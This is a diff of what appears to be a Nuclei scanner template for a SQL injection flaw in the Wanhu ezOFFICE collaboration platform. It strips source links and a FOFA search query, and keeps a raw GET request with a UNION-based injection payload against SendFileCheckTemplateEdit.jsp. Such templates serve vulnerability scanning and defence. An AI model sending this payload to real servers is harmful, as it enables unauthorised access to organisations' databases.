@@ -3,12 +3,8 @@ info:
   name: 万户ezOFFICE协同管理平台 SendFileCheckTemplateEdit SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yz13vchocwd4u9s6'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yz13vchocwd4u9s6
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - 'GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1''%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
